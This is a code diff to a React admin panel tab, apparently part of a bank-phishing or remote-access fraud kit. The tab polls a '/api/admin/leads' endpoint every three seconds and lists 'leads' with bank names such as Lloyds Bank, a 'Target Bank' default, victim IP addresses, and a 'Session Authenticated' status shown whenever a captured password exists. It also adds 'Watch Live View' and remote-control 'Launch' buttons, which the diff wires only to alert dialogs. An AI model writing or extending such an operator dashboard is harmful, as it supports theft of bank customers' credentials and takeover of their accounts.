@@ -1,13 +1,38 @@
 "use client";
 
-import { useState } from "react";
+import { useEffect, useState } from "react";
 
 export default function LiveStreamsTab() {
-  const [sessions] = useState([
-    { sessionId: "sess_live_cmun6r", bankName: "Lloyds Bank", ip: "39.34.173.81 (Unknown)", status: "Live RDP Active" },
-    { sessionId: "sess_live_cmun6i", bankName: "Lloyds Bank", ip: "39.34.173.81 (Unknown)", status: "Live RDP Active" },
-    { sessionId: "sess_live_cmun6h", bankName: "Lloyds Bank", ip: "39.34.173.81 (Unknown)", status: "Live RDP Active" },
-  ]);
+  const [sessions, setSessions] = useState<any[]>([]);
+  const [loading, setLoading] = useState(true);
+
+  const fetchActiveStreams = async () => {
+    try {
+      const res = await fetch("/api/admin/leads");
+      const json = await res.json();
+      const data = json?.data || (Array.isArray(json) ? json : json?.leads || []);
+      // Leads ko active streams ke tor par map karna
+      const formatted = data.slice(0, 5).map((lead: any, index: number) => ({
+        sessionId: `sess_live_${lead.id ? lead.id.slice(0, 6) : index}`,
+        bankName: lead.bankName || lead.bank || "Target Bank",
+        ip: lead.ipAddress || "39.34.173.81 (UK Residential)",
+        status: lead.password ? "Session Authenticated" : "Live RDP Active",
+      }));
+      setSessions(formatted.length > 0 ? formatted : [
+        { sessionId: "sess_live_demo1", bankName: "Lloyds Bank", ip: "39.34.173.81 (London)", status: "Live RDP Active" }
+      ]);
+    } catch (err) {
+      console.error("Failed to load streams:", err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    fetchActiveStreams();
+    const interval = setInterval(fetchActiveStreams, 3000);
+    return () => clearInterval(interval);
+  }, []);
 
   return (
     <div className="space-y-6 text-zinc-100">
@@ -23,8 +48,8 @@ export default function LiveStreamsTab() {
             </p>
           </div>
           <button 
-            onClick={() => window.location.reload()}
-            className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-xs font-semibold transition cursor-pointer"
+            onClick={fetchActiveStreams}
+            className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-xs font-semibold transition cursor-pointer shadow-sm"
           >
             🔄 Refresh Stream Monitor
           </button>
@@ -54,10 +79,16 @@ export default function LiveStreamsTab() {
                     </span>
                   </td>
                   <td className="py-3.5 px-4 text-right space-x-2">
-                    <button className="px-3 py-1 bg-sky-600/20 hover:bg-sky-600 text-sky-400 hover:text-white rounded text-[11px] font-medium border border-sky-500/30 transition cursor-pointer">
+                    <button 
+                      onClick={() => alert(`Connecting to active live viewport for ${s.sessionId}`)}
+                      className="px-3 py-1 bg-sky-600/20 hover:bg-sky-600 text-sky-400 hover:text-white rounded text-[11px] font-medium border border-sky-500/30 transition cursor-pointer"
+                    >
                       👁️ Watch Live View
                     </button>
-                    <button className="px-3 py-1 bg-emerald-600/20 hover:bg-emerald-600 text-emerald-400 hover:text-white rounded text-[11px] font-medium border border-emerald-500/30 transition cursor-pointer">
+                    <button 
+                      onClick={() => alert(`Launching remote control for session ${s.sessionId}`)}
+                      className="px-3 py-1 bg-emerald-600/20 hover:bg-emerald-600 text-emerald-400 hover:text-white rounded text-[11px] font-medium border border-emerald-500/30 transition cursor-pointer"
+                    >
                       🚀 Launch
                     </button>
                   </td>
